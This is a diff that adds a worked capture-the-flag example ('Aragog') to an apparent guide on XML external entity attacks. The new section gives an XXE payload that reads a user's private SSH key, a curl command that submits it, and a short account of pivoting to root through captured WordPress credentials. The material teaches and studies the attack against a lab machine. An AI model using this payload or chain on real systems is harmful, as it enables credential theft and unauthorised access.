@@ -66,6 +66,23 @@ In data pipelines the key file is usually the broker's or the ingestion service'
 - **Out-of-band with `expect://`** (PHP with the extension): direct execution.
 - **DoS**: be careful with billion laughs; fine in a lab, never in production.
 
+## Real case: Aragog
+
+`hosts.php` accepts XML to add a host and returns the result. The name field resolves external entities, so `florian`'s private key can be read and used over SSH:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE hosts [<!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa">]>
+<hosts><host><ip>10.10.14.6</ip><name>&xxe;</name></host></hosts>
+```
+
+```bash
+curl -s -X POST http://aragog.htb/hosts.php \
+  -H 'Content-Type: application/xml' --data-binary @hosts.xml
+```
+
+The key appears in the response. It gives SSH as `florian`; `pspy` shows that `wp-login.php` is modified and writes submitted credentials to a file. That capture allows reusing the WordPress password for `root`. The lesson is twofold: XXE does not only read files, it also feeds the next credential in the chain.
+
 ## Hardening
 
 ```python
